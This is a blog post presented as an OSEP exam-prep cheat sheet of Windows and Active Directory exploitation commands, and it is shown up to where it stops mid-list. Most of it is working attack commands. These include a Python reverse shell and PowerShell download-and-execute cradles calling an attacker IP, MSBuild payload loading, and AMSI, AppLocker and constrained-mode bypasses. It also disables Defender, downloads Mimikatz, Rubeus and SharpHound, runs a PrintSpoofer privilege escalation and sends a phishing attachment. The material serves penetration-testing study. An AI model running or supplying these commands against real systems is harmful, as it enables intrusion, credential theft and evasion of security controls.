<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-59099331-16"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());
        gtag('config', 'UA-59099331-16');
    </script>

    
    <link rel="prefetch" as="script" href="/components/wc.1649616843771.js">
    <link rel="stylesheet" href="https://use.typekit.net/rcr1opg.css">
    <script src="/design/js/app.8a3db0a15fa2c79b14a5.js"></script>
    <link rel="stylesheet" type="text/css" href="/design/css/app.8a3db0a15fa2c79b14a5.css">
    <script defer src="/components/wc.1649616843771.js"></script>

    
    <title>OSEP Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference.</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="viewport" content="width=device-width,minimum-scale=1">

    
    


    
 







    <link rel="canonical" href="https://exploit-me.com/blog/osep-cheat-sheet/" />

    <meta name="description" content="This post contains OSEP notes for Exam Prepration.">
    <meta name="image" content="https://exploit-me.com/img/covers/default.png">

    <meta property="og:title" content="OSEP Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference." />
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://exploit-me.com/blog/osep-cheat-sheet/" />
    <meta property="og:image" content="https://exploit-me.com/img/covers/default.png" />
    <meta property="og:description" content="This post contains OSEP notes for Exam Prepration." />

    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@fireship_dev">
    <meta name="twitter:title" content="OSEP Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference.">
    <meta name="twitter:description" content="This post contains OSEP notes for Exam Prepration.">
    <meta name="twitter:image" content="https://exploit-me.com/img/covers/default.png">
    

    
    <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
    <link rel="apple-touch-icon" type="image/x-icon" href="/img/favicon.png" />
    <meta name="theme-color" content="#454e56">

    <link rel="manifest" href="/manifest.json">
    <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/sw.js');
            });
        }
    </script>

    
    <script src="https://js.stripe.com/v3/"></script>
    <script
        src="https://www.paypal.com/sdk/js?client-id=ATn5LO-IKaYXAfi07gaHgfkq6LNvupXMTe2zczFKdZYSyZZ4Ax92EdJhoiP4OvbvCIRFUczsAJTZEXZH&disable-funding=credit,card">
    </script>
    
    
    

    
</head>
 

  <body class="dark-theme">
    
      <nav class="topnav">

 <script>
        function cheat_sheet(url){
            console.log("Working!!");
             window.open(url, '_blank').focus();
        }
        </script>


  <div class="topnav-logo explot_logo">
    <a href="/" class="khan">
      <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 viewBox="0 0 428.000000 175.000000"
 preserveAspectRatio="xMidYMid meet">

<g transform="translate(0.000000,175.000000) scale(0.100000,-0.100000)"
fill="white" stroke="none">
<path d="M3144 1670 c-34 -13 -64 -59 -64 -97 0 -20 4 -32 10 -28 6 3 10 20
10 36 0 19 10 39 26 56 21 21 32 24 62 19 54 -8 72 -36 72 -112 l0 -63 -117
-3 -118 -3 1 -90 c0 -71 5 -98 20 -123 40 -69 135 -93 202 -52 49 30 72 88 72
188 0 75 -2 82 -20 82 -18 0 -20 7 -20 55 0 70 -21 112 -65 131 -39 16 -42 16
-71 4z m154 -301 c-3 -90 -3 -91 -40 -125 -32 -29 -45 -34 -87 -34 -89 0 -131
57 -131 180 l0 70 131 0 131 0 -4 -91z"/>
<path d="M3140 1391 c-5 -11 -7 -40 -4 -65 6 -42 9 -46 35 -46 25 0 29 4 29
28 0 15 5 33 12 40 9 9 9 18 0 37 -14 31 -56 34 -72 6z m57 -17 c3 -8 1 -20
-6 -27 -6 -6 -11 -19 -11 -29 0 -30 -17 -20 -24 13 -3 17 -6 38 -6 45 0 19 39
18 47 -2z"/>
<path d="M3606 1470 c-66 -26 -81 -41 -217 -224 -120 -160 -149 -217 -149
-291 0 -48 29 -125 66 -176 19 -26 34 -51 34 -55 0 -5 -22 -24 -49 -42 -27
-18 -57 -42 -66 -52 -33 -36 2 -21 66 30 63 49 92 60 104 40 3 -5 14 -10 23
-9 13 0 11 4 -8 17 -92 63 -138 131 -147 217 -10 98 6 135 145 320 116 156
132 172 185 199 99 50 188 31 261 -56 69 -82 208 -282 227 -326 27 -63 25
-153 -5 -217 -21 -47 -67 -97 -125 -137 -14 -10 -22 -21 -18 -24 4 -4 15 0 25
9 27 25 38 22 104 -29 33 -25 64 -44 69 -42 6 2 -19 25 -55 51 -37 27 -66 50
-66 51 0 2 13 17 29 34 71 74 99 193 67 288 -10 29 -66 118 -141 220 -112 154
-130 175 -177 198 -62 31 -114 33 -182 6z"/>
<path d="M3901 1193 c102 -106 125 -126 118 -105 -6 17 -201 212 -212 212 -6
0 37 -48 94 -107z"/>
<path d="M3480 1218 c-64 -72 -62 -83 4 -18 52 51 66 71 49 69 -5 0 -28 -23
-53 -51z"/>
<path d="M3630 1217 c-53 -20 -58 -23 -197 -156 -122 -115 -131 -126 -126
-155 9 -57 92 -166 126 -166 6 0 -8 18 -31 40 -43 42 -65 76 -75 121 -5 21 2
34 48 79 30 30 57 52 60 49 3 -3 7 -43 10 -90 4 -61 11 -91 25 -111 11 -15 20
-43 20 -62 0 -41 35 -87 80 -106 16 -7 30 -15 30 -19 -1 -3 -20 -51 -44 -106
-33 -79 -46 -100 -61 -98 -20 2 -32 -11 -65 -69 -12 -21 -17 -38 -11 -38 6 0
22 20 36 45 30 50 21 50 138 -4 37 -18 67 -36 67 -42 0 -5 -9 -27 -20 -49 -22
-43 -24 -50 -12 -50 4 0 20 25 36 57 21 42 24 58 15 64 -18 11 34 87 62 91 15
2 26 14 32 33 13 40 15 42 31 19 12 -16 15 -16 19 -4 45 139 45 136 12 144
-32 8 -32 24 0 36 31 12 65 66 65 102 0 15 9 42 20 60 16 26 20 51 20 118 l0
85 51 -51 c46 -46 50 -55 44 -82 -3 -18 -27 -54 -52 -82 -27 -31 -39 -50 -30
-50 32 0 107 110 107 156 0 26 -238 263 -285 285 -46 22 -95 23 -145 6z m138
-23 c20 -8 63 -43 94 -77 l58 -61 0 -97 c0 -89 -2 -99 -24 -120 -19 -19 -23
-30 -18 -61 4 -33 0 -44 -23 -68 -42 -44 -77 -55 -114 -36 -27 14 -30 20 -25
49 10 56 11 57 59 57 25 0 45 4 45 9 0 5 3 16 6 25 3 9 1 16 -5 16 -6 0 -11
-7 -11 -15 0 -8 -12 -18 -27 -21 -20 -5 -30 -2 -44 15 -9 11 -31 24 -47 27
-25 5 -31 2 -37 -15 -10 -33 -54 -39 -77 -11 -22 27 -29 24 -17 -7 6 -18 16
-23 44 -23 21 0 35 -5 35 -12 0 -18 -26 -103 -31 -101 -2 1 -16 4 -31 8 -43
11 -70 48 -76 105 -2 27 -8 50 -12 50 -17 0 -30 58 -30 141 l0 90 63 60 c34
33 76 67 92 74 41 18 108 18 153 -1z m-59 -396 c0 -13 -4 -44 -8 -71 -9 -54
-9 -55 72 -87 31 -12 59 -26 62 -30 7 -11 -15 -80 -25 -80 -5 0 -12 5 -16 11
-8 14 -33 -26 -34 -53 0 -10 -10 -22 -22 -29 -13 -6 -39 -29 -59 -51 l-36 -41
-56 26 c-31 14 -57 28 -57 31 0 3 22 56 49 118 27 62 59 150 72 196 18 63 28
82 41 82 12 0 18 -7 17 -22z"/>
<path d="M3519 1070 c-29 -24 -22 -25 19 -4 29 14 35 14 62 0 31 -15 39 -9 18
12 -18 18 -73 14 -99 -8z"/>
<path d="M3759 1070 c-29 -24 -22 -25 19 -4 29 14 35 14 64 0 36 -19 51 -13
22 9 -27 21 -78 18 -105 -5z"/>
<path d="M3548 993 c18 -2 45 -2 60 0 15 2 0 4 -33 4 -33 0 -45 -2 -27 -4z"/>
<path d="M3742 933 l1 -68 6 60 6 60 55 6 55 6 -62 1 -63 2 2 -67z"/>
<path d="M104 987 c-2 -7 -3 -107 -2 -222 l3 -210 148 -3 c125 -2 147 0 147
12 0 13 -23 16 -132 18 l-133 3 0 85 0 85 98 3 c77 2 97 6 97 17 0 12 -19 15
-100 15 l-100 0 0 85 0 85 135 0 c109 0 135 3 135 14 0 22 -24 26 -161 26 -96
0 -131 -3 -135 -13z"/>
<path d="M1190 806 c0 -116 4 -194 11 -210 18 -39 89 -60 89 -26 0 5 -11 12
-25 16 -14 3 -26 7 -27 8 -1 0 -4 89 -7 196 -5 175 -8 195 -23 198 -17 3 -18
-11 -18 -182z"/>
<path d="M2382 773 c2 -162 6 -217 16 -221 9 -3 12 32 13 150 0 84 4 161 7
171 5 12 30 -29 90 -148 45 -91 86 -165 92 -165 6 0 47 74 92 165 46 91 86
165 90 165 4 0 9 -74 10 -165 2 -99 7 -166 13 -168 6 -1 11 77 13 216 2 192 1
217 -13 217 -11 0 -46 -61 -106 -185 -50 -102 -95 -183 -100 -179 -5 3 -50 86
-99 185 -57 114 -96 179 -105 179 -13 0 -15 -29 -13 -217z"/>
<path d="M1747 967 c-8 -20 9 -41 27 -34 23 9 21 47 -3 47 -10 0 -21 -6 -24
-13z"/>
<path d="M1937 953 c-4 -3 -7 -28 -7 -54 0 -44 -2 -48 -27 -51 -36 -4 -41 -26
-6 -30 l28 -3 5 -100 c3 -63 10 -108 19 -122 18 -26 52 -43 86 -43 40 0 30 28
-14 40 -51 13 -63 43 -59 146 l3 79 43 3 c54 4 52 25 -4 32 l-39 5 -3 53 c-3
49 -10 61 -25 45z"/>
<path d="M455 850 c-4 -6 16 -40 44 -75 28 -36 51 -66 51 -69 0 -2 -22 -32
-50 -66 -47 -59 -61 -90 -41 -90 5 0 33 30 62 66 l53 67 36 -43 c79 -98 78
-97 85 -78 5 12 -5 33 -32 65 -21 27 -44 55 -51 64 -10 14 -4 26 38 80 48 62
60 89 40 89 -5 0 -33 -29 -61 -65 -28 -36 -52 -65 -53 -65 -1 0 -24 29 -51 65
-49 66 -59 73 -70 55z"/>
<path d="M885 850 c-32 -13 -75 -64 -85 -101 -6 -18 -10 -100 -10 -181 0 -141
1 -148 20 -148 19 0 20 7 20 90 0 50 3 90 7 90 4 0 17 -10 30 -22 33 -31 117
-36 161 -9 101 64 96 221 -8 273 -37 19 -101 23 -135 8z m120 -36 c81 -38 85
-170 6 -217 -83 -49 -181 10 -181 108 0 95 89 150 175 109z"/>
<path d="M1410 838 c-55 -38 -75 -73 -75 -133 0 -149 181 -211 279 -95 22 27
26 41 26 92 0 50 -5 67 -26 95 -50 66 -140 84 -204 41z m134 -23 c112 -53 71
-235 -54 -235 -69 0 -120 53 -120 125 0 97 86 151 174 110z"/>
<path d="M1755 848 c-3 -8 -4 -77 -3 -153 3 -117 6 -140 18 -140 13 0 15 23
15 149 0 111 -3 150 -12 153 -7 3 -15 -2 -18 -9z"/>
<path d="M3001 842 c-52 -28 -73 -74 -69 -149 4 -68 25 -100 82 -130 36 -19
114 -13 152 11 37 25 17 43 -24 22 -62 -32 -138 -12 -167 44 -8 16 -15 34 -15
39 0 6 48 11 123 13 l122 3 3 27 c2 15 -4 43 -13 63 -33 69 -123 95 -194 57z
m122 -23 c26 -12 57 -57 57 -83 0 -14 -15 -16 -104 -16 -61 0 -107 4 -111 10
-10 15 27 73 56 87 30 16 71 16 102 2z"/>
<path d="M2120 705 c0 -13 13 -15 80 -13 107 4 108 22 3 26 -70 2 -83 0 -83
-13z"/>
<path d="M3339 605 c-45 -35 -59 -54 -69 -90 -7 -25 -10 -48 -7 -51 3 -3 8 5
12 18 17 60 31 80 81 114 29 20 51 41 48 45 -7 12 -2 15 -65 -36z"/>
<path d="M3940 642 c0 -5 24 -28 54 -51 44 -34 56 -50 65 -87 6 -25 15 -42 20
-39 13 7 -16 95 -36 111 -71 53 -103 74 -103 66z"/>
<path d="M3500 625 c7 -8 20 -15 29 -15 13 1 13 3 -3 15 -26 19 -42 19 -26 0z"/>
</g>
</svg>

      
    </a>
  </div>

  <div class="topnav-links flex-center for_responsive_view">
      <a href="/" class="item item-text exploit_logo" aria-label="blog">
          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-house" viewBox="0 0 16 16">
  <path fill-rule="evenodd" d="M2 13.5V7h1v6.5a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5V7h1v6.5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13.5zm11-11V6l-2-2V2.5a.5.5 0 0 1 .5-.5h1a.5.5 0 0 1 .5.5z"/>
  <path fill-rule="evenodd" d="M7.293 1.5a1 1 0 0 1 1.414 0l6.647 6.646a.5.5 0 0 1-.708.708L8 2.207 1.354 8.854a.5.5 0 1 1-.708-.708L7.293 1.5z"/>
</svg>
          Home
      </a>


    <a href="/blog" class="item item-text" aria-label="blog">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><g><path fill="currentColor" d="M392 168.07s0-8-168-8c-152 0-152 8-152 8s-8 0-8 120 8 120 8 120 0 8 152 8c168 0 168-8 168-8s8 0 8-120-8-120-8-120zM173.14 96h165.72l35.64-41.32a32 32 0 1 0-45.3-45.3L256 94.27 182.8 9.48a32 32 0 0 0-45.3 45.29z" class="fk-secondary"></path><path fill="currentColor" d="M464 96.07H48a48 48 0 0 0-48 48v288a48 48 0 0 0 48 48h16v32h48l21.3-32h245.3l21.3 32h48v-32h16a48 48 0 0 0 48-48v-288a47.86 47.86 0 0 0-47.9-48zm-72 312s0 8-168 8c-152 0-152-8-152-8s-8 0-8-120 8-120 8-120 0-8 152-8c168 0 168 8 168 8s8 0 8 120-8 120-8 120zm72-100a12 12 0 0 1-12 12h-8a12 12 0 0 1-12-12v-8a12 12 0 0 1 12-12h8a12 12 0 0 1 12 12zm0-64a12 12 0 0 1-12 12h-8a12 12 0 0 1-12-12v-8a12 12 0 0 1 12-12h8a12 12 0 0 1 12 12z" class="fk-primary"></path></g></svg>
      Blog
    </a>

    <a href="/about"  class="item item-text about_logo" aria-label="CheatSheet">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><g><path fill="currentColor" d="M320 320H128a32 32 0 0 0-32 32v32h256v-32a32 32 0 0 0-32-32zM136 208h176a8 8 0 0 0 8-8v-16a8 8 0 0 0-8-8H136a8 8 0 0 0-8 8v16a8 8 0 0 0 8 8z" class="fk-secondary"></path><path fill="currentColor" d="M96 512h256v-96H96zM320 80h-8V56a56.06 56.06 0 0 0-56-56h-64a56.06 56.06 0 0 0-56 56v24h-8A128 128 0 0 0 0 208v240a64 64 0 0 0 64 64V352a64.07 64.07 0 0 1 64-64h192a64.07 64.07 0 0 1 64 64v160a64 64 0 0 0 64-64V208A128 128 0 0 0 320 80zM184 56a8 8 0 0 1 8-8h64a8 8 0 0 1 8 8v24h-80zm136 144a8 8 0 0 1-8 8H136a8 8 0 0 1-8-8v-16a8 8 0 0 1 8-8h176a8 8 0 0 1 8 8z" class="fk-primary"></path></g></svg>
      About
    </a>

    <a href="/tags" class="item item-text tag_logo" aria-label="Tags">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><g><path fill="currentColor" d="M497.94 225.94L286.06 14.06A48 48 0 0 0 252.12 0H48A48 48 0 0 0 0 48v204.12a48 48 0 0 0 14.06 33.94l211.88 211.88a48 48 0 0 0 67.88 0l204.12-204.12a48 48 0 0 0 0-67.88zM112 160a48 48 0 1 1 48-48 48 48 0 0 1-48 48z" class="fk-secondary"></path><path fill="currentColor" d="M625.94 293.82L421.82 497.94a48 48 0 0 1-67.88 0l-.36-.36 174.06-174.06a90 90 0 0 0 0-127.28L331.4 0h48.72a48 48 0 0 1 33.94 14.06l211.88 211.88a48 48 0 0 1 0 67.88z" class="fk-primary"></path></g></svg>
      Tags
    </a>
    
 
  </div>


  <div class="topnav-icons flex-center">

    
 <modal-button selector="algolia-search">
  <a href="#" onclick="cheat_sheet('https://exploit-me.com/cheatsheet/')" class="item item-text" aria-label="CheatSheet">
      <span class="item search_icon">
          
<svg aria-hidden="true" focusable="false" data-prefix="fad" data-icon="search" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fk-search fk-w-16 fk-9x">
<g class="fk-group"><path fill="currentColor" d="M208 80a128 128 0 1 1-90.51 37.49A127.15 127.15 0 0 1 208 80m0-80C93.12 0 0 93.12 0 208s93.12 208 208 208 208-93.12 208-208S322.88 0 208 0z" class="fk-secondary"></path><path fill="currentColor" d="M504.9 476.7L476.6 505a23.9 23.9 0 0 1-33.9 0L343 405.3a24 24 0 0 1-7-17V372l36-36h16.3a24 24 0 0 1 17 7l99.7 99.7a24.11 24.11 0 0 1-.1 34z" class="fk-primary">
</path></g></svg>
          <span class="item-label tag tag-blue tag-sm">Search</span>
      </span>
  </a>
    </modal-button>

  <theme-btn >
      <span slot="dark" class="item"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><g><path fill="currentColor" d="M502.42 240.5l-94.7-47.3 33.5-100.4c4.5-13.6-8.4-26.5-21.9-21.9l-100.4 33.5-47.41-94.8a17.31 17.31 0 0 0-31 0l-47.3 94.7L92.7 70.8c-13.6-4.5-26.5 8.4-21.9 21.9l33.5 100.4-94.7 47.4a17.31 17.31 0 0 0 0 31l94.7 47.3-33.5 100.5c-4.5 13.6 8.4 26.5 21.9 21.9l100.41-33.5 47.3 94.7a17.31 17.31 0 0 0 31 0l47.31-94.7 100.4 33.5c13.6 4.5 26.5-8.4 21.9-21.9l-33.5-100.4 94.7-47.3a17.33 17.33 0 0 0 .2-31.1zm-155.9 106c-49.91 49.9-131.11 49.9-181 0a128.13 128.13 0 0 1 0-181c49.9-49.9 131.1-49.9 181 0a128.13 128.13 0 0 1 0 181z" class="fk-secondary"></path><path fill="currentColor" d="M352 256a96 96 0 1 1-96-96 96.15 96.15 0 0 1 96 96z" class="fk-primary"></path></g></svg></span>
      <span slot="light" class="item"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><g><path fill="currentColor" d="M320 32L304 0l-16 32-32 16 32 16 16 32 16-32 32-16zm138.7 149.3L432 128l-26.7 53.3L352 208l53.3 26.7L432 288l26.7-53.3L512 208z" class="fk-secondary"></path><path fill="currentColor" d="M332.2 426.4c8.1-1.6 13.9 8 8.6 14.5a191.18 191.18 0 0 1-149 71.1C85.8 512 0 426 0 320c0-120 108.7-210.6 227-188.8 8.2 1.6 10.1 12.6 2.8 16.7a150.3 150.3 0 0 0-76.1 130.8c0 94 85.4 165.4 178.5 147.7z" class="fk-primary"></path></g></svg></span>
      <span class="item-label tag tag-pink tag-sm">Theme</span>
  </theme-btn>
    
    
    

  </div>


  

  
</nav>

    

    

    
    <main role="main">
      

  <article itemscope itemtype="http://schema.org/Article">
    <meta itemprop="datePublished" content="2022-04-10 15:55:41 &#43;0200 CEST" />
    <meta itemprop="dateModified" content="2022-04-10 15:55:41 &#43;0200 CEST" />
    <meta itemprop="image" content="img/featured.png" />
    <meta itemprop="publisher" content="fireship.io" />


    <h1 itemprop="name headline" id="osep-windows--active-directory-exploitation-cheat-sheet-and-command-reference" class="post-title border-bottom">
        OSEP Windows &amp; Active Directory Exploitation Cheat Sheet and Command Reference.
    </h1>

    <div class="content-main">

      <section class="content-article" itemprop="articleBody">

        
          <header>
    

    

    <div class="post-info">
        <div class="post-description">
            <p itemprop="description">
                This post contains OSEP notes for Exam Prepration.
                <strong><span class="text-thin" itemprop="wordCount">1747 words.</span></strong>
            </p>

            

<div class="author-snip">

    
        <div class="author-details">
            
<em>By
    <a itemprop="author" name="Asif Durani" href="/about/">Asif Durani</a>
</em> 
        </div>

    </div>


            <div class="text-sm">
                Created <time itemprop="dateCreated">Apr 10, 2022</time><br>
                <span class="tag">Last Updated <time itemprop="dateModified">Apr 10, 2022</time> </span>
            </div>

        </div>

        <div class="post-detail">
    

        <div class="post-tags">
    <a href="/tags/offensive"><span class="tag tag-sm tag-offensive">#offensive</span></a>

    <a href="/tags/osep"><span class="tag tag-sm tag-osep">#osep</span></a>

    <a href="/tags/active-directory-exploitation"><span class="tag tag-sm tag-active-directory-exploitation">#active-directory-exploitation</span></a>
</div>
        </div>
    </div>

    




</header>


          <div class="content-body">
            <h1 id="introduction">Introduction</h1>
<p>I decided to compile a list of my most-used techniques and commands for Microsoft Windows and Active Directory (post-)exploitation.</p>
<h3 id="ad-cheatgen-my-own-command-reference-generator">AD-Cheatgen my own Command Reference generator.</h3>
<p>I have created a small command reference generator Called ADCheatgen. This will generate a userfull list of commands.
ADCheatgen can be downloaded from : <a href="https://github.com/ksecurity45/ADCheatgen">https://github.com/ksecurity45/ADCheatgen</a></p>
<h3 id="collect-proof-for-osep-exam">Collect proof for OSEP exam.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hostname <span class="p">&amp;</span> <span class="nb">type</span> c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\p</span>roof.txt   <span class="p">&amp;</span> ipconfig
<span class="c1"># Windows</span>
echo. <span class="p">&amp;</span> echo. <span class="p">&amp;</span> <span class="nb">echo</span> whoami: <span class="p">&amp;</span> whoami 2&gt; nul <span class="p">&amp;</span> <span class="nb">echo</span> %username% 2&gt; nul <span class="p">&amp;</span> echo. <span class="p">&amp;</span> <span class="nb">echo</span> Hostname: <span class="p">&amp;</span> hostname <span class="p">&amp;</span> echo. <span class="p">&amp;</span> ipconfig /all <span class="p">&amp;</span> echo. <span class="p">&amp;</span> <span class="nb">echo</span> proof.txt: <span class="p">&amp;</span>  <span class="nb">type</span> <span class="s2">&#34;C:\Documents and Settings\Administrator\Desktop\proof.txt&#34;</span>

<span class="c1"># Linux</span>
<span class="nb">echo</span> <span class="s2">&#34; &#34;</span><span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34;uname -a:&#34;</span><span class="p">;</span>uname -a<span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34; &#34;</span><span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34;hostname:&#34;</span><span class="p">;</span>hostname<span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34; &#34;</span><span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34;id&#34;</span><span class="p">;</span>id<span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34; &#34;</span><span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34;ifconfig:&#34;</span><span class="p">;</span>/sbin/ifconfig -a<span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34; &#34;</span><span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34;proof:&#34;</span><span class="p">;</span>cat /root/proof.txt 2&gt;/dev/null<span class="p">;</span> cat /Desktop/proof.txt 2&gt;/dev/null<span class="p">;</span><span class="nb">echo</span> <span class="s2">&#34; &#34;</span>
</code></pre></div><h3 id="color-the-text-in-terminal">Color the text in terminal.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">tput setaf 3<span class="p">;</span>cat commands.txt
</code></pre></div><h3 id="send-email-to-client-side-attack">send email to Client side attack</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
    Client side attack
<span class="c1">################################################</span>
sendemail -f attacker@email.com -t vactim@email.com -u attacker -m attackerpass -s x.x.x.x:25 -vvv -a resume.doc
</code></pre></div><h3 id="execute-command-in-remote-computer">Execute command in remote computer.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">###############</span>
Fix the bugs
<span class="c1">##############</span>
Invoke-Command -ComputerName dc02 -ScriptBlock <span class="o">{</span>ipconfig<span class="o">}</span>
</code></pre></div><h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
    Information Gathering
<span class="c1">################################################</span>
nmap -f -oG victim.com.nmap_quick victim.com
nmap --open -Pn -p - -sV -sC -T4 -oA victim.com.nmap_full --open victim.com
nmap -p0- -v -A -T4 -oA victim.com.nmap_full_aggresive 192.168.49.57
</code></pre></div><h3 id="update-the-shell">Update the shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">###############################################</span>
    tty shell Update
<span class="c1">###############################################</span>
python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
    Ctrl+z
stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
reset
<span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
</code></pre></div><h3 id="initial-shell">Initial Shell</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
    Initial Shell <span class="o">(</span>nc_port:446, python_port:4242<span class="o">)</span> 
<span class="c1">################################################</span>

powershell.exe -c <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.49.57/Verified/ps/nc.txt&#39;);&#34;</span>   
python -c <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.49.57,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;</span>

  
  
-------Meter_preter------------------
cmd.exe /c powershell wget http://192.168.49.57/Verified/new/payload.xml -O C:<span class="se">\P</span>rogramData<span class="se">\p</span>ayload.xml<span class="p">;</span>C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\M</span>SBuild.exe C:<span class="se">\P</span>rogramData<span class="se">\p</span>ayload.xml
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/bad.ps1&#39;</span><span class="o">)</span> <span class="p">|</span> IEX

----------Start Powershell------------------   
powershell.exe -nop -ep bypass

---Powershell_repal--------
curl -o powershell-repl.csproj http://192.168.49.57/Verified/xml/powershell-repl.csproj <span class="o">&amp;&amp;</span> C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\m</span>sbuild.exe powershell-repl.csproj

</code></pre></div><h3 id="bypass-av--amsi--constrain-mode--applocker">Bypass AV / AMSI / CONSTRAIN MODE / APPLOCKER</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
    Bypass_AV_AMSI_Constrained_MODE_APPLOCKER
<span class="c1">################################################</span>

----------Constrained_mode------------------
<span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
wget http://10.10.14.105/Verified/bin/bypass-clm.exe -o C:<span class="se">\P</span>rogramData<span class="se">\b</span>ypass-clm.exe --&gt; exe not present.
                 
----------AMSI BYPASS--------------
powershell.exe -nop -ep bypass
<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;http://192.168.49.57/Verified/ps/amsi-bypass.txt&#39;</span><span class="o">)</span> <span class="p">|</span> IEX
    
----------Applocker Bypass-----------
C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\i</span>nstallutil.exe /logfile<span class="o">=</span> /LogToConsole<span class="o">=</span><span class="nb">false</span> /U C:<span class="se">\P</span>rogramData<span class="se">\b</span>ypass-clm.exe 

---------Disable Antivirus------------
Set-Mppreference -disablerealtimemonitoring <span class="m">1</span> 

--------Disable Restricted_mode------
New-ItemProperty -Path <span class="s2">&#34;HKLM:\System\CurrentControlSet\Control\Lsa&#34;</span> -Name <span class="s2">&#34;DisableRestrictedAdmin&#34;</span> -Value <span class="m">0</span>
</code></pre></div><h3 id="printspoofer-exploit">Printspoofer exploit</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">###############################################</span>
Privielge Escalation
<span class="c1">###############################################</span>
PrintSpoofer.exe -i -c cmd.exe
</code></pre></div><h3 id="weaponized-tools">Weaponized tools.</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">################################################</span>
Weaponized tools.
<span class="c1">################################################</span>
  
curl -o ADCollector.exe  http://192.168.49.57/Verified/bin/ADCollector.exe
curl -o nmap.zip  http://192.168.49.57/Verified/nmap/nmap-7.92-win32.zip
curl -o Mimi_new.zip  http://192.168.49.57/Verified/compressedfile/Mimi_new.zip
curl -o npcap.exe http://192.168.49.57/Verified/nmap/npcap-1.60.exe
curl -o PsExec64.exe  http://192.168.49.57/Verified/bin/PsExec64.exe 
curl -o Rubeus.exe  http://192.168.49.57/Verified/bin/Rubeus.exe 
curl -o chisel.exe  http://192.168.49.57/Verified/bin/chisel.exe 
curl -o SharpUp.exe  http://192.168.49.57/Verified/bin/SharpUp.exe 
curl -o SpoolSample.exe  http://192.168.49.57/Verified/bin/SpoolSample.exe 
curl -o SharpHound.exe  http://192.168.49.57/Verified/bin/SharpHound.exe
curl -o DAFT.exe  http://192.168.49.57/Verified/SQLAUDIT/DAFT.exe 

v#TODO
curl -o SQLServerClient.exe  http://192.168.49.57/Verified/bin/SQLServerClient.exe 
curl -o PrintSpooferNet.exe  http://192.168.49.57/Verified/bin/PrintSpooferNet.exe 
curl -o katzimim.exe  http://192.168.49.57/Verified/bin/katzimim.exe 
